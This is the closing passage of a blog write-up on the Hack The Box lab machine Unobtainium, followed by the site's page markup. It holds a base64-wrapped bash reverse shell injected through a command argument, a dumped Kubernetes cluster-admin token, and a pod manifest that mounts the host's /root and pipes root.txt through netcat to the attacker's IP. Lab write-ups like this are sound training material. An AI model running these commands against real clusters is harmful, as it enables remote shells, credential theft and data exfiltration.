└──╼ [★]$ chmod +x rev.sh
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium]
└──╼ [★]$ ./rev.sh "& echo $(echo 'bash -i >& /dev/tcp/10.10.14.12/9002 0>&1' | base64) | base64 -d | bash"
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium]
└──╼ [★]$ </code></pre>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd16.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    Boom we got the <code class="highlighter-rouge">shell</code> as <code class="highlighter-rouge">devnode-deployment</code>.
                                </p>
                                <p>
                                    Now again tranfer the <code class="highlighter-rouge">kubectl</code> executable in the box and check if we list <code class="highlighter-rouge">secrets</code> now.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@devnode-deployment-cd86fb5c-qlxww:/tmp# ls
kubectl  v8-compile-cache-0
root@devnode-deployment-cd86fb5c-qlxww:/tmp# chmod +x kubectl 
root@devnode-deployment-cd86fb5c-qlxww:/tmp# /tmp/kubectl auth can-i list secrets -n kube-system
yes
root@devnode-deployment-cd86fb5c-qlxww:/tmp# </code></pre>
                                <p>
                                    Yes we have the <code class="highlighter-rouge">permission</code> now Let get the <code class="highlighter-rouge">secrets</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@devnode-deployment-cd86fb5c-qlxww:/tmp# /tmp/kubectl get secrets -n kube-system            
NAME                                             TYPE                                  DATA   AGE
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      90d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      90d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      89d
certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      90d
clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      90d
coredns-token-dbp92                              kubernetes.io/service-account-token   3      90d
cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      90d
daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      90d
default-token-l85f2                              kubernetes.io/service-account-token   3      90d
deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      90d
disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      90d
endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      90d
endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      90d
endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      90d
expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      90d
generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      90d
horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      90d
job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      90d
kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      90d
namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      90d
node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      90d
persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      90d
pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      90d
pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      90d
pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      90d
replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      90d
replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      90d
resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      90d
root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      90d
service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      90d
service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      90d
statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      90d
storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      90d
token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      90d
ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      90d
root@devnode-deployment-cd86fb5c-qlxww:/tmp#</code></pre>
                                <p>
                                    If you see the <code class="highlighter-rouge">third</code> option <code class="highlighter-rouge">Cluster Administrator -> c-admin-token-tfmp2</code> is the secret of the <code class="highlighter-rouge">Cluster</code> Administrator.
                                </p>
                                <p>
                                    Let's get the token of <code class="highlighter-rouge">Cluster Administrator -> c-admin-token-tfmp2</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@devnode-deployment-cd86fb5c-qlxww:/tmp# /tmp/kubectl describe secrets/c-admin-token-tfmp2 -n kube-system
Name:         c-admin-token-tfmp2
Namespace:    kube-system
Labels:       &#x3C;none&#x3E;
Annotations:  kubernetes.io/service-account.name: c-admin
              kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0

Type:  kubernetes.io/service-account-token

Data
====
ca.crt:     1066 bytes
namespace:  11 bytes
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
root@devnode-deployment-cd86fb5c-qlxww:/tmp# </code></pre>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd17.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    Let's list the info of the <code class="highlighter-rouge">token</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@devnode-deployment-cd86fb5c-qlxww:/tmp# /tmp/kubectl --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info
Kubernetes control plane is running at https://10.96.0.1:443
KubeDNS is running at https://10.96.0.1:443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
root@devnode-deployment-cd86fb5c-qlxww:/tmp# </code></pre>
                                <p>
                                    Let's check if we create <code class="highlighter-rouge">pods</code> or not if we can create pods we can use <code class="highlighter-rouge">BadPods</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@devnode-deployment-cd86fb5c-qlxww:/tmp# /tmp/kubectl --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow auth can-i create pod
yes
root@devnode-deployment-cd86fb5c-qlxww:/tmp# </code></pre>
                                <p>
                                    Yes we can create <code class="highlighter-rouge">pods</code> now let's create a <code class="highlighter-rouge">BadPods</code>. where everything is allowed with the help of <code class="highlighter-rouge">BadPods</code>.
                                </p>
                                <blockquote>
                                    <code class="highlighter-rouge">Link</code> : <a href="https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed" target="_blank">Bad Pod #1: Everything allowed</a>
                                </blockquote>
                                <blockquote>
                                    <code class="highlighter-rouge">Link</code> : <a href="https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml" target="_blank">everything-allowed-exec-pod.yaml</a>
                                </blockquote>
                                <p>
                                    I modify the <code class="highlighter-rouge">everything-allowed-exec-pod.yaml</code> file to get the root hash and save the file as <code class="highlighter-rouge">dedsec.yaml</code>.
                                </p>
                                <h2>dedsec.yaml</h2>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-yaml line-numbers">apiVersion: v1
kind: Pod
metadata:
  name: some-pod
  namespace: default
spec:
  containers:
    - name: web
      image: localhost:5000/dev-alpine
      command: ["/bin/sh"]
      args: ["-c", 'cat /root/root.txt | nc -nv 10.10.14.12 9005; sleep 100000']
      volumeMounts:
      - mountPath: /root/
        name: root-flag
  volumes:
  - hostPath:
      path: /root/
      type: ""
    name: root-flag</code></pre>
                                <p>
                                    Change the <code class="highlighter-rouge">ip</code> and we <code class="highlighter-rouge">good</code> to go.
                                </p>
                                <p>
                                    Just tranfer the <code class="highlighter-rouge">dedsec.yaml</code> in target box insode <code class="highlighter-rouge">/tmp</code> folder and start your netcat listner to get the <code class="highlighter-rouge">root.txt</code> file.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-bash line-numbers">root@devnode-deployment-cd86fb5c-qlxww:/tmp# wget http://10.10.14.12/dedsec.yaml
--2021-04-17 10:16:05--  http://10.10.14.12/dedsec.yaml
Connecting to 10.10.14.12:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 405 [application/octet-stream]
Saving to: 'dedsec.yaml'

dedsec.yaml                                     100%[=====================================================================================================>]     405  --.-KB/s    in 0s      

2021-04-17 10:16:06 (70.1 MB/s) - 'dedsec.yaml' saved [405/405]

root@devnode-deployment-cd86fb5c-qlxww:/tmp# /tmp/kubectl create -f /tmp/dedsec.yaml --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
pod/some-pod created
root@devnode-deployment-cd86fb5c-qlxww:/tmp#</code></pre>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium]
└──╼ [★]$ nc -nvlp 9005 > root.txt
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9005
Ncat: Listening on 0.0.0.0:9005
Ncat: Connection from 10.10.10.235.
Ncat: Connection from 10.10.10.235:44555.
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium]
└──╼ [★]$ cat root.txt 
ef65aae67fda1e3fe6c4f3c2aad1a4b1
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium]
└──╼ [★]$ </code></pre>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd18.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    If you want <code class="highlighter-rouge">reverse</code> shell you can use this.
                                </p>
                                <blockquote>
                                    <code class="highlighter-rouge">Link</code> : <a href="https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml" target="_blank">everything-allowed-revshell-pod.yaml</a>
                                </blockquote>





                                <p>
                                    <p>And we pwned it …….</p>
                                    <p>
                                        <img src="/assets/img/sample/complete.gif" alt="Complete">
                                    </p>
                                    <p>
                                        If u liked the writeup.Support a Student to Get the <code class="highlighter-rouge">OSCP-Cert</code>
                                        <a href="https://0xdedinfosec.github.io/tabs/donation/" target="_blank">Donation for OSCP</a>
                                    </p>
                                    <h1 id="resources">Resources</h1>
                                <table>
                                    <thead>
                                        <tr>
                                            <th>Topic
                                            <th>
                                                Url
                                    <tbody>
                                        <tr>
                                            <td>Prototype Pollution
                                            <td>
                                                <a href="https://snyk.io/vuln/SNYK-JS-LODASH-73638"
                                                    target="_blank">https://snyk.io/vuln/SNYK-JS-LODASH-73638</a>
                                        <tr>
                                            <td>Command Injection
                                            <td>
                                                <a href="https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431"
                                                    target="_blank">https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431</a>
                                        <tr>
                                            <td>Install kubectl binary with curl on Linux
                                            <td>
                                                <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux"
                                                    target="_blank">https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux</a>
                                        <tr>
                                            <td>Chisel
                                            <td>
                                                <a href="https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s"
                                                    target="_blank">https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s</a>
                                        <tr>
                                            <td>Bad Pod #1: Everything allowed
                                            <td>
                                                <a href="https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed"
                                                    target="_blank">https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed</a>
                                        <tr>
                                            <td>everything-allowed-exec-pod.yaml
                                            <td>
                                                <a href="https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml"
                                                    target="_blank">https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml</a>
                                        <tr>
                                            <td>eeverything-allowed-revshell-pod.yaml
                                            <td>
                                                <a href="https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml"
                                                    target="_blank">https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml</a>
                                </table>
                    </div>
                    <div class="post-tail-wrapper text-muted">
                        <div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2">
                            <div class="license-wrapper">
                                <span class="license-text ml-1 mr-1">
                                    This post is licensed under 
                                    <a href="https://creativecommons.org/licenses/by/4.0/">
                                        CC BY 4.0 <i class="fab fa-creative-commons"></i>
                                        <i class="fab fa-creative-commons-by"></i>
                                    </a>
                                </span>
                            </div>
                            <!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License -->
                            <div class="share-wrapper">
                                <span class="share-label ml-1 mr-1">Share</span>
                                <span class="share-icon">
                                    <a href="#" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank">
                                        <i class="fa-fw fab fa-twitter mr-1"></i>
                                    </a>
                                    <a href="https://www.facebook.com/dedsecinfoServices/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank">
                                        <i class="fa-fw fab fa-facebook-square mr-1"></i>
                                    </a>
                                    <a href="#" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank">
                                        <i class="fa-fw fab fa-telegram mr-1"></i>
                                    </a>
                                    <i class="fa-fw fas fa-link mr-1 small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i>
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="panel-wrapper" class="col-xl-3 pl-2 topbar-down">
                <div class="access">
                    <div id="access-lastmod" class="post mb-4">
                        <h3 data-toc-skip>Recent Update</h3>
                        <ul class="post-content pl-0 pb-1 ml-1 mt-2">
                            <li>
                                <a href="/posts/htb-unobtainium/">Hackthebox Unobtainium writeup</a>
                            </li>
                        </ul>
                    </div>
                    <div id="access-tags">
                        <script async="async" data-cfasync="false" src="//contributorshaveangry.com/12712f6b55ac81fa45e77d0da10aee84/invoke.js"></script>
                        <div id="container-12712f6b55ac81fa45e77d0da10aee84"></div>
                    </div>
                </div>
            </div>
        </div>
        <div class="row">
            <div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8">
                <div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
                    <div class="post-navigation d-flex justify-content-between">
                        <a href="/posts/htb-jewel/" class="btn btn-outline-primary">
                            <p>Hackthebox Jewel writeup</p>
                        </a>
                        <a href="/posts/htb-reel2/" class="btn btn-outline-primary">
                            <p>Fortress Reel2 writeup</p>
                        </a>
                    </div>
                    <!-- Disqus  -->
                    <script id="dsq-count-scr" src="//0xdedinfosec.disqus.com/count.js" async></script>
                    <div id="disqus_thread"></div>
                    <script>
                    var disqus_config = function () {
                    this.page.url = 'https://0xdedinfosec.github.io/posts/htb-unobtainium/';  
                    this.page.identifier = '/posts/htb-unobtainium/';
                    };
                    (function() {
                    var d = document, s = d.createElement('script');
                    s.src = 'https://0xdedinfosec.disqus.com/embed.js';
                    s.setAttribute('data-timestamp', +new Date());
                    (d.head || d.body).appendChild(s);
                    })();
                    </script>
                    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
                            
                    <!-- Disqus end -->
                    <div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2">
                        <h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3>
                        <div class="card-deck mb-4">
                            <div class="card">
                                <a href="/posts/htb-jewel/">
                                    <div class="card-body">
                                        <span class="timeago small">
                                            Oct 29, 2020 <i class="unloaded">2020-10-29T00:00:00+00:00</i>
                                        </span>
                                        <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Jewel writeup</h3>
                                        <div class="text-muted small">
                                            <p>information Column Details Name Jewel IP 10.10.10.211 Points 30 Os Linux ...</p>
                                        </div>
                                    </div>
                                </a>
                            </div>
                            <div class="card">
                                <a href="/posts/hackthebox-reel2/">
                                    <div class="card-body">
                                        <span class="timeago small">
                                            Oct 05, 2020 <i class="unloaded">2020-10-05T00:00:00+00:00</i>
                                        </span>
                                        <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Reel2 writeup</h3>
                                        <div class="text-muted small">
                                            <p>information@Sauna:~$ Column Details Name Reel2 IP 10.10.10.210 Points 40 Os Windo...</p>
                                        </div>
                                    </div>
                                </a>
                            </div>
                            <div class="card">
                                <a href="/posts/htb-doctor/">
                                    <div class="card-body">
                                        <span class="timeago small">
                                            Sep 28, 2020 <i class="unloaded">2020-09-28T00:00:00+00:00</i>
                                        </span>
                                        <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Doctor writeup</h3>
                                        <div class="text-muted small">
                                            <p>Information@openadmin:~$ Column Details Name Doctor IP 10.10.10.209 Points 20 Os ...</p>
                                        </div>
                                    </div>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
        <script type="text/javascript">
            const observer = lozad();
            observer.observe();
        </script>
        <footer class="d-flex w-100 justify-content-center">
            <div class="d-flex justify-content-between align-items-center">
                <div class="footer-left">
</p></div>
<p class="mb-0">
    © 2020 <a href="https://www.facebook.com/dedsecinfoServices/">Dedinfosec</a>
    . <span data-toggle="tooltip" data-placement="top" title="The blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License.">All rights reserved.</span>
    <script>
        (function(i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r;
            i[r] = i[r] || function() {
                (i[r].q = i[r].q || []).push(arguments)
            }
            ,
            i[r].l = 1 * new Date();
            a = s.createElement(o),
            m = s.getElementsByTagName(o)[0];
            a.async = 1;
            a.src = g;
            m.parentNode.insertBefore(a, m)
        }
        )(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
        ga('create', 'G-5LG9K52X15', 'auto');
        ga('send', 'pageview');
    </script>
    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5LG9K52X15"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-5LG9K52X15');
</script>
<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="DEDINFOSEC88" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#FFDD00" data-position="right" data-x_margin="18" data-y_margin="18"></script>
</footer></div>
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
    <div class="col-12 col-xl-11 post-content">
        <div id="search-hints">
            <h4 class="text-muted">Trending Tags</h4>
            <a class="post-tag" href="/tags/cve/">CVE</a>
            <a class="post-tag" href="/tags/linpeas/">LinPEAS</a>
            <a class="post-tag" href="/tags/mysql-backdoor/">MySQL Backdoor</a>
            <a class="post-tag" href="/tags/server-side-template-injection/">Server-Side Template Injection</a>
            <a class="post-tag" href="/tags/ftp/">FTP</a>
            <a class="post-tag" href="/tags/sireprat/">SirepRAT</a>
            <a class="post-tag" href="/tags/jackson/">Jackson</a>
            <a class="post-tag" href="/tags/gtfobins/">GTFO-Bins</a>
            <a class="post-tag" href="/tags/pypi-server/">pypi-server</a>
            <a class="post-tag" href="/tags/email-extractor/">email-extractor</a>
        </div>
        <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
    </div>
</div>
</div><div id="mask"></div>
<a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button">
    <i class="fas fa-angle-up"></i>
</a>
<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script>
<script>
    SimpleJekyllSearch({
        searchInput: document.getElementById('search-input'),
        resultsContainer: document.getElementById('search-results'),
        json: '/assets/data/search.json',
        searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://0xdedinfosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>',
        noResultsText: '<p class="mt-5">Oops! No result founds.</p>'
    });
</script>
</body>
</html>